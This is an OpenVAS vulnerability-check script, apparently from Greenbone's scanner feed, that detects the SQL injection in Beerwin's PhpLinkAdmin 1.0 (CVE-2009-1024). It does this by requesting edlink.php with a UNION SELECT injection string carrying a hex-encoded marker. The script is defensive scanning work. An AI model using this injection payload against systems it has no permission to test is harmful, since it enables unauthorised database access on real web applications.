###############################################################################
# OpenVAS Vulnerability Test
# $Id: Beerwins_PhpLinkAdmin_1_0.nasl 14325 2019-03-19 13:35:02Z asteins $
#
# Beerwin's PhpLinkAdmin Remote File Include and Multiple SQL
# Injection Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100058");
  script_version("$Revision: 14325 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:35:02 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-03-18 10:43:43 +0100 (Wed, 18 Mar 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1024");
  script_bugtraq_id(34129);
  script_name("Beerwin's PhpLinkAdmin Remote File Include and Multiple SQL Injection Vulnerabilities");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"Beerwin's PhpLinkAdmin is prone to multiple input-validation
  vulnerabilities, including a remote file-include issue and multiple
  SQL-injection issues.");

  script_tag(name:"impact", value:"A successful exploit may allow an attacker to execute malicious code
  within the context of the webserver process, compromise the
  application, access or modify data, or exploit latent
  vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"Beerwin's PhpLinkAdmin 1.0 is vulnerable. Other versions may also be
  affected.");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34129");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/phplinkadmin", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/edlink.php?linkid=-1%27%20union%20all%20select%201,2,3,4,0x53514c2d496e6a656374696f6e2d54657374%27--");

  if(http_vuln_check(port:port, url:url,pattern:"SQL-Injection-Test")) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
